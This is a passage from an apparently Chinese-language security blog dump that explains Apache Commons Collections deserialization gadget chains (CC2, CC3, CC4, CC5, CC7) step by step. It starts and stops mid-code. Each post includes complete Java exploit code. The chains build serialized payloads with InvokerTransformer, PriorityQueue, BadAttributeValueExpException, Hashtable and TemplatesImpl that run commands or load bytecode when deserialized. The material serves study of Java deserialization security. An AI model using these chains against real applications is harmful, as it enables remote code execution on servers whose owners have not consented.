Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, new ConstantTransformer(1)); //传入一个普通Map HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); hMap2.put(&quot;key2&quot;, &quot;value2&quot;); //Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(hMap2, &quot;value1&quot;); tableMap.put(decorateEXP, &quot;tableMapValue2&quot;); Class&lt;? extends LazyMap&gt; aClass = decorateEXP.getClass(); Field factoryField = aClass.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(decorateEXP, chainedTransformer); util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;);&#125; 但是序列化不报错不弹出计算器了，反序列化也不报错不弹出计算器，在Hashtable#reconstitutionPut处打上断点，看看问题在哪 注意，第一次运行到断点时是进入了readObject的第一次循环，此时是不会进入reconstitutionPut的循环中的，需要第二次运行到reconstitutionPut才能仅需循环 通过断点发现，此时if中的第一个条件结果为false，那么就不会进入第二个条件，直接跳过if中的代码进入后续代码了 也就是说(e.hash == hash)这里必须要为true，这里的hash是当前reconstitutionPut方法执行时获取的key的hash，那么还需要搞明白e.hash是什么，这里需要结合readObject方法中和reconstitutionPut方法的两段循环来看，简写代码如下： 1234567891011121314151617private void readObject()&#123; for (; elements &gt; 0; elements--) &#123; reconstitutionPut(table, key, value); &#125;&#125;private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)&#123; int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; fo r (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 在反序列化执行readObject方法时，会遍历读取被序列化对象中的键值对，就是在tableMap.put(decorateEXP, &quot;value4&quot;);中传入的键值对，当读取第一个键值对并进入reconstitutionPut方法时，会先根据key获得hash，然后获得index(类似于脚标,用来标记存放值的位置)，之后进入循环，但是循环创建e时出现问题，当前并没有tab对象，tab是循环结束后创建的。也就是说当readObject中第一次循环进入reconstitutionPut时，并没有进入该方法的for循环，而是根据传入的参数进行赋值计算，然后把这些值作为一个Entry放入到tab[index]中。 此时readObject第一次循环结束，然后进入到第二次循环，再次进入reconstitutionPut方法中，然后根据当前运行时传入的key计算获得hash。此时在上一次循环中已经创建tab，并且将上一次获取的Entry放入的tab中，那么就会进入循环。这里就是在遍历tab中的每一个Entry实体，获取在将Entry放入时的hash，与当前准备存入的Entry的hash进行比对，如果相同就会报错，不同则放入tab中进入下一次循环。 简单来说，就是reconstitutionPut会将当前接收的key.hash已经还原过的Entry中的hash进行比对，相同就会进入e.key.equals(key)执行到后续恶意代码。 那么我们如何保证比对双方的hash相同呢？这里的hash都是通过int hash = key.hashCode();计算再放入，这里的key是来自于反序列化时读取到的key，就是我们传入其中的LazyMap。 那么我们构造的两个LazyMap放入相同的map即可。 此时给两个LazyMap放入相同的map，那么此时获取的LazyMap也是相同的，也就是说在反序列化时，获得两个Entry都是相同的，那么必然会触发报错。 但是真的是这样吗？ 此时进行序列化再反序列化，readObject只执行了一次，这是为什么？ 原因在与Hashtable#put方法对传入的key进行了hash计算，hash相同时并且字符相等时，key不变，后面的value会替换之前的value，这是Map系列集合中的特性，为了保持键值对的唯一性。 此时好像进入了一个死局，要执行后续代码就要传入两个相同的Map，当时相同的Map又不能同时存在。这里就利用到java中的一个小bug：在java中，yy和zZ的hash值时相等的，直接通过代码System.out.println(&quot;yy&quot;.hashCode() + &quot;+++&quot; + &quot;zZ&quot;.hashCode());就可以得到，但是这里yy和zZ又不满足equals，那么如果我们构造的两个LazyMap中分别使用这两个值，就能保持序列化的时候，hash相同但是能够put，反序列化时key.hash又是相同的 再次进行序列化和反序列化，当第二次循环时发现，当前key中存在两个键值对，这是为什么呢？ 这里的原因出在Hashtable#put，在第一次put时，Hashtable中没有值，就不会进入循环，第二次put时就会进入循环，然后我们又满足了entry.hash == hash，就会进入equals方法，这里最后会进入到LazyMap#get，这里在之前说过，运行的结果LazyMap#get作为懒加载，对Hashtable第二次put时的键值对新加了一对键值对。 在put之后直接通过remove去除即可。同时，这里传入的两个LazyMap，无法决定反序列化时谁第一次循环，谁第二次循环，所以都要传入恶意chansformer，那么这里防止序列化执行命令的反射操作就要进行修改，这里通过反射处理ChainedTransformer中的属性。 构造出来的最终EXP如下： 12345678910111213141516171819202122232425262728293031323334public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;yy&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); //传入一个普通Map Map decorate = LazyMap.decorate(new HashMap&lt;&gt;(), chainedTransformer); decorate.put(&quot;zZ&quot;, &quot;value1&quot;); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(decorate, &quot;value3&quot;); tableMap.put(decorateEXP, &quot;value4&quot;); decorateEXP.remove(&quot;zZ&quot;); Class&lt;? extends ChainedTransformer&gt; aClass = chainedTransformer.getClass(); Field iTransformersField = aClass.getDeclaredField(&quot;iTransformers&quot;); iTransformersField.setAccessible(true); iTransformersField.set(chainedTransformer, transformers); util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;); &#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(7)：CC链5","slug":"CC链5","date":"2025-07-20T08:04:03.000Z","updated":"2025-07-21T15:25:02.248Z","comments":true,"path":"2025/07/20/CC链5/","permalink":"http://example.com/2025/07/20/CC%E9%93%BE5/","excerpt":"","text":"CC链5CC链5就是在CC链1-LazyMap的基础上进行修改。CC链1-LazyMap中LazyMap#get利用的调用点是AnnotationInvocationHandler#invoke。在CC链5中则是换成了TiedMapEntry#toString。也就是说CC链5还是基于commons-collections:3.2.1版本 所以执行点还是采用CC链1-LazyMap，把后面的调用点和入口进行更换即可 调用点：TiedMapEntry#toString查找LazyMap#get的调用，在TiedMapEntry#getValue中存在调用，然后继续查找这个方法的调用 123public Object getValue() &#123; return map.get(key);&#125; 然后在TiedMapEntry#toString方法中找到了调用 123public String toString() &#123; return getKey() + &quot;=&quot; + getValue();&#125; 在这个类中，根据构造方法需要传入一个map和一个key。这里的map要去调用LazyMap#get，所以这里传入构造的LazyMap，按照之前的思路，key这里其实可以随意传入参数，或者传入反射获取的Runtime.getRuntime()，从而不必通过ConstantTransformer进行传入 那么根据当前状态构造出EXP如下： 12345678910111213141516171819public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;aaa&quot;); tiedMapEntry.toString(); //new BadAttributeValueExpException&#125; 下一步就需要寻找toString的调用 反序列化入口：BadAttributeValueExpException#readObject在BadAttributeValueExpException#readObject方法中存在toString的同名方法调用 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); &#125;&#125; 这里的valObj需要传入构造的tiedMapEntry对象，看看valObj的赋值 ois.readFields()是从输入流中读取当前类的所有非transient、非static的字段值，然后通过get方法获取名叫val的属性，也就是说valObj来自于属性val 而val的赋值来自于构造方法 这里的三元运算符意思是：如果接收的val是bull，那么this.val就是null。如果不是则赋值val.toString。 也就是说我们传入tiedMapEntry在赋值时就会执行一次toString，为了避免这种情况，后续还是采用反射的方法，先传入一个任意值，然后通过反射修改赋值，最后进行序列化。 EXP构造根据调用过程，我们需要构造一个BadAttributeValueExpException对象，然后传入tiedMapEntry对象，那么此时EXP如下： 12345678910111213141516171819public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;aaa&quot;); //tiedMapEntry.toString(); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry); util.serialize(badAttributeValueExpException); util.unserialize(&quot;ser.bin&quot;);&#125; 运行的时候发现，序列化时弹出了计算器，但是反序列化时没有执行。 序列化时弹出计算器是因为构造方法实例化对象时执行了toString方法，那么我们先把这个问题进行处理。也就是通过反射修改值，效果如下： 1234567891011121314151617181920212223242526public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;aaa&quot;); //tiedMapEntry.toString(); // 创建时传入任意值，然后通过反射修改回来 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;bbb&quot;); Class&lt;? extends BadAttributeValueExpException&gt; aClass = badAttributeValueExpException.getClass(); Field valFeild = aClass.getDeclaredField(&quot;val&quot;); valFeild.setAccessible(true); valFeild.set(badAttributeValueExpException, tiedMapEntry); util.serialize(badAttributeValueExpException); util.unserialize(&quot;ser.bin&quot;);&#125; 此时序列化已经不会弹出计算器了，并且反序列化时也会弹出计算器，反序列化这里问题应该和CC链1-LazyMap差不多，是LazyMap的懒加载相关导致的","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(6)：CC链2","slug":"CC链2","date":"2025-07-20T07:21:11.000Z","updated":"2025-07-20T08:03:49.860Z","comments":true,"path":"2025/07/20/CC链2/","permalink":"http://example.com/2025/07/20/CC%E9%93%BE2/","excerpt":"","text":"CC链2CC链2只是在CC链4的基础上进行了简单的修改。YSO中CC链4是继续查找TemplatesImpl类的调用，也就是CC链3中的执行点TrAXFilter（虽然我没有这么写）。CC链2就是通过invoke直接去反射创建TemplatesImpl，中间的调用点还是基于优先队列 所以这里直接把CC链4的的执行点改造一下即可，需要注意的是，改造之后在序列化时也会执行命令，所以这里需要先在代码赋值时改变原本的调用链，然后再通过反射修改属性，最后再进行序列化 那么构造的最终EXP效果如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class CC2 &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //int compare = transformingComparator.compare(1, 2); PriorityQueue&lt;Object&gt; objects = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(new ConstantTransformer(1))); Class&lt;? extends PriorityQueue&gt; aClass = objects.getClass(); Field sizeField = aClass.getDeclaredField(&quot;size&quot;); sizeField.setAccessible(true); sizeField.setInt(objects, 2); Field comparatorField = aClass.getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(objects, transformingComparator); //util.serialize(objects); util.unserialize(&quot;ser.bin&quot;); &#125;&#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(5)：CC链4","slug":"CC链4","date":"2025-07-17T13:51:02.000Z","updated":"2025-07-21T16:12:23.329Z","comments":true,"path":"2025/07/17/CC链4/","permalink":"http://example.com/2025/07/17/CC%E9%93%BE4/","excerpt":"","text":"CC链4CC链1、3、6都是组件commons-collections 3.2.1及之前的版本，CC链4则是利用commons-collections 4.0这个版本中的组件。 在CC链4中TransformingComparator提供了serializeable序列化接口。 其实和前面三条链没有太大变化，唯一变化的就是中间的调用点部分 执行点：InvokerTransformer执行点依旧是InvokerTransformer，使用命令执行还是动态加载都可以，我这里使用命令执行。 调用点：TransformingComparator#compare这里依旧查找transform的调用，只不过这一次是寻找commons-collections 4.0中的调用，然后找到了TransformingComparator#compare这个点 12345public int compare(final I obj1, final I obj2) &#123; final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);&#125; 可以看到这里是个很常见的方法，就是接收两个参数进行比较，这里的transformer是通过构造方法赋值，那么创建这个对象就可以把恶意transformer传进去 构造如下代码，就能够执行弹出计算器 123456789101112public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); int compare = transformingComparator.compare(1, 2);&#125; 调用点：PriorityQueue#siftDownUsingComparatorcompare的可利用调用点在PriorityQueue#siftDownUsingComparator这个地方，PriorityQueue是java中优先队列相关类，这里这个调用方法就涉及到二叉树之类的算法，这里直接看代码比较麻烦，可以先打上断点，后续通过动态调试来确定EXP应该如何构造 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x;&#125; 这里的comparator需要传入我们前面构造的transformingComparator，而comparator是通过构造方法赋值的。 调用点：PriorityQueue#siftDown查找siftDownUsingComparator的调用，也在当前类中，具体是siftDown这个方法 123456private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);&#125; 调用点：PriorityQueue#heapify查找PriorityQueue#siftDown的调用，还是在当前类的heapify方法中 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);&#125; 反序列化入口：PriorityQueue#readObject查找PriorityQueue#heapify的调用点，直接找到了当前类的readObject方法，那么就可以把这里当作反序列化入口来构造EXP 123456789101112131415161718private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify();&#125; EXP构造查看PriorityQueue的构造方法，是public修饰，那么就可以直接创建对象，这里接收两个参数，第一个是个数字并且不能小于1，第二个就是我们构造的恶意transformingComparator 123456789public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator;&#125; 那么就新建一个对象，传入参数然后进行序列化，大概就是这个样子 123456789101112131415public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //int compare = transformingComparator.compare(1, 2); PriorityQueue&lt;Object&gt; objects = new PriorityQueue&lt;Object&gt;(2, transformingComparator); util.serialize(objects); util.unserialize(&quot;ser.bin&quot;);&#125; 接下来通过打断点进行动态调试，来修改参数 动态调试在各个调用点依次打上断点，先对恶意对象序列化，然后在反序列化时进行调试 在heapify处遇到了问题，这里相当于是将size除以2，然后遍历，但是我们这里size为0，不会进入循环，就不会调用到后续函数 所以我们这里采用反射，直接修改size的值为2，这样就会进入一次循环 123456789101112131415161718192021public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //int compare = transformingComparator.compare(1, 2); PriorityQueue&lt;Object&gt; objects = new PriorityQueue&lt;Object&gt;(2, transformingComparator); Class&lt;? extends PriorityQueue&gt; aClass = objects.getClass(); Field sizeField = aClass.getDeclaredField(&quot;size&quot;); sizeField.setAccessible(true); sizeField.setInt(objects, 2); util.serialize(objects); util.unserialize(&quot;ser.bin&quot;);&#125; 此时反序列化调试已经能够成功进入循环，并且能够直接弹出计算器 与yso中CC链4的差异我这里和yso中的CC链4是不同的，yso中使用的是CC链3中TrAXFilter这里去进行动态加载，我这里采用命令执行 另外对size的处理也不同，yso中是通过优先队列的特性，直接通过priorityQueue.add(1); 去修改size，我这里是直接通过反射去修改","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(4)：CC链3","slug":"CC链3","date":"2025-07-13T14:20:21.000Z","updated":"2025-07-16T16:09:48.535Z","comments":true,"path":"2025/07/13/CC链3/","permalink":"http://example.com/2025/07/13/CC%E9%93%BE3/","excerpt":"","text":"CC链3CC链3和CC链6以及CC链1的执行点不同，采用的是类动态加载的方式，CC链6和CC链1是命令执行，而CC链3则是代码执行。 简单来说，CC链1和CC链6都是通过InvokerTransfomer传入执行Runtime类的方法来执行命令 而CC链3是通过通过InvokerTransfomer传入执行构造出来的类加载器来执行指定的JAVA代码 相当于给CC1和CC6构造了一个更复杂的执行点 简述动态加载在类的动态加载中，一般是通过ClassLoader-&gt;loadclass-&gt;findClass-&gt;defineClass这个流程进行类加载，在最后的defineClass加载java字节码，但是只加载字节码是不运行代码的，还需要找到一个初始化的地方才会运行类中的代码 执行点：ClassLoader在classLoader中存在许多defineClass方法，我们需要找到一个被外部调用的，找到了下面这个方法 12345protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len) throws ClassFormatError&#123; return defineClass(name, b, off, len, null);&#125; 这里面的参数分别是： name：类的全限定名，就是包名.类名的形式 b：要加载的类的字节码数组 off：b的起始偏移量，即从哪个索引开始读取字节码，一般是0 len：要读取的字节码的长度，一般是b.length 调用点：TemplatesImpl.TransletClassLoader查找外部调用了defineClass方法的地方，找到了TemplatesImpl下面的一个静态类：TransletClassLoader 123456static final class TransletClassLoader extends ClassLoader &#123; ...... Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length); &#125;&#125; 这里的defineClass没有修饰符，默认是default，在当前包中查找调用。只接收一个参数，java类的字节码文件。继续查找调用 调用点：TemplatesImpl#defineTransletClasses在当前类中找到defineTransletClasses方法中存在一处调用，这里获得了字节码，然后进行赋值操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new HashMap&lt;&gt;(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); // 在这里进行调用 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125;&#125; 这里的_bytecodes来自于构造方法，在类的实例化时创建 继续查找这个方法的调用点，查找到三处，这里选择其中getTransletInstance方法 调用点：TemplatesImpl#getTransletInstance选择这处调用的原因是该方法代码中使用了newInstance进行初始化，意味着走完这个函数就能动态加载完字节码并执行，另外两处都没有进行初始化。并且这里是一个get方法，fastjson中的一条链就是这里，具体后续针对fastjson再说。 1234567891011121314151617181920private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; 这里我们需要查看_class[_transletIndex]是如何赋值的，这里赋值其实就是在defineTransletClasses方法中进行的，具体位置如下图： 注意这里，遍历时调用了每一个defineClass[i]，这里其实就是在遍历加载类字节码数组，同时后续构造参数时还需要注意这里。 那么这里_class[_transletIndex]就是可控的，接下来继续寻找getTransletInstance方法的调用 调用点：TemplatesImpl#newTransformerTemplatesImpl#getTransletInstance这个方法的调用点只有一处，在当前类的Transformer方法中 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 这里是一个public方法，在new TransformerImpl直接调用，那么可以在这里尝试构造EXP了 EXP初步构造构造函数之前需要确定参数调用以及赋值 在TemplatesImpl#getTransletInstance中，需要给_name属性赋值，但是这里不在构造方法中进行赋值，所以需要手动赋值 在TemplatesImpl#defineTransletClasses中，_bytecodes需要赋值，_tfactory在过程中需要调用方法，也需要赋值 需要注意赋值的类型，_name仅判断是否为空，可以赋值任意字符串。_bytecodes是以二维数组的形式传入需要加载的类字节码数组。 注意这里_tfactory是通过transient修饰，即不可序列化的变量，所以给他赋值是没有意义的，因为反序列化时是不会被传入的 那么应该怎么处理这里？既然需要这个属性，又无法被序列化，那么可以在反序列化的地方看看是如何赋值的，即查看readObject方法中是如何传递的 可以看到，在反序列化时这里是直接被创建的 但是我们现在需要的是正向执行看EXP的效果，所以这里还是需要暂时进行赋值，构造出代码如下： 这段代码基本满足调用逻辑，并且运行时能够执行加载的类中的代码，则说明没问题 12345678910111213141516171819202122232425public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass(); Field nameFied = aClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = aClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); // _bytecodes 是一个二维数组，但是参数传递过程中通过遍历获取其中的每一个一维数组进行加载 // 这里先将字节码读取为一个一维数组，然后把这个一维数组放入一个二维数组 byte[] code = 